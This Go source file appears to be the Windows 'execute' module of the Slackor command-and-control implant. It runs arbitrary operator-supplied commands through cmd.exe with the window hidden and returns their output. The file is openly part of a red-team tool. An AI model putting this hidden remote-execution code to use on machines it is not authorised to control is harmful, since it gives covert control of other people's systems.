// +build windows

package windows

import (
	"bytes"
	"fmt"
	"os/exec"
	"strings"
	"syscall"

	"github.com/Coalfire-Research/Slackor/pkg/command"
)

var cmdName = "cmd.exe"

// Execute runs an arbitrary command
type Execute struct{}

// Name is the name of the command
func (e Execute) Name() string {
	return "execute"
}

// Run runs an arbitrary command
func (e Execute) Run(clientID string, jobID string, args []string) (string, error) {
	cmdArgs := []string{"/c"}
	cmdArgs = append(cmdArgs, args...)
	cmd := exec.Command(cmdName, cmdArgs...)
	fmt.Println("Running command: " + strings.Join(args, " "))
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := cmd.Run()
	if err != nil {
		return stderr.String(), err
	}
	return out.String(), nil
}

func init() {
	command.RegisterCommand(Execute{})
}
